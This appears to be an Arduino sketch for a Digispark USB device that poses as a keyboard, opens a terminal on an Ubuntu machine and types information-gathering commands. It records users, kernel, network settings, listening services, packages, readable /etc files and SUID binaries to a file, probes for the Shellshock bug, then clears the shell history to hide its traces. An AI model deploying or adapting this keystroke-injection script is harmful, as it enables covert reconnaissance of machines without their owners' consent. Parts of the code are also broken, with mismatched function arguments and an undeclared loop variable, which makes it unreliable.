// DigiDuck code courtesy of uslurper. https://github.com/uslurper
// This program currently does not allow the BREAK key, since I couldn't find it in the USB HID spec.

#include "DigiKeyboard.h"

#define KEY_TAB 43
#define KEY_DOWN 81
#define KEY_DELETE 42
#define KEY_PRINTSCREEN 70
#define KEY_SCROLLLOCK 71
#define KEY_INSERT 73
#define KEY_PAUSE 72
#define KEY_HOME 74
#define KEY_PAGEUP 75
#define KEY_END 77
#define KEY_PAGEDOWN 78
#define KEY_RIGHTARROW 79
#define KEY_RIGHT 79
#define KEY_DOWNARROW 81
#define KEY_LEFTARROW 80
#define KEY_UP 82
#define KEY_UPARROW 82
#define KEY_NUMLOCK 83
#define KEY_CAPSLOCK 57
#define KEY_MENU 118

void digidelay(int n) {

	DigiKeyboard.delay(n);
	DigiKeyboard.sendKeyStroke(0);

}

void digikeypress(String s) {

	DigiKeyboard.sendKeyStroke(s);
	digidelay(50);

}

void digiprint(String s) {

	DigiKeyboard.println(s);
	digidelay(50);

}

void setup() {

	// Info gathering Ubuntu 1.0 Script issues OS info gathering commands in terminal - by Captain_Harlock, Improved by Thecakeisgit, optimized for Digispark by uslurper
	digidelay(3000);
	digikeypress(KEY_T, MOD_CTRL_LEFT | MOD_ALT_LEFT);
	digidelay(1450);
	digiprint("clear");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Logged in user: \" $USER > info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo -n \"Distribution Kernel Version: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("cat /etc/issue | cut -c1-13 >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo -n \"uname results: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("uname -a >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digidelay(50);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Shellsock Bug Vulnerability: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	for (i0=0; i0<2; i0++) {
		digiprint("echo >> info_gathering.txt");
		digikeypress(KEY_ENTER);
	}
	digiprint("echo \"Mounted filesystems: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("mount -l >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digidelay(50);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Network Configuration: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("ifconfig -a | grep 'Link\\|inet' >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Print Hosts: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("cat /etc/hosts >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Print ARP: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("arp >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Development tools availability: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("which gcc >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("which g++ >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("which python >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Print TCP/UDP Listening Services: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("netstat -tunlpe >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digidelay(250);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Installed Packages: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digidelay(150);
	digiprint("dpkg -l >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digidelay(250);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Find Readable Folders in /etc: \" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digidelay(450);
	digiprint("echo >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("echo \"Find SUID and GUID files\" >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digiprint("find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt");
	digikeypress(KEY_ENTER);
	digidelay(15000);
	digiprint("history -c");
	digikeypress(KEY_ENTER);
	digiprint("exit");
	digikeypress(KEY_ENTER);

}

void loop() {


}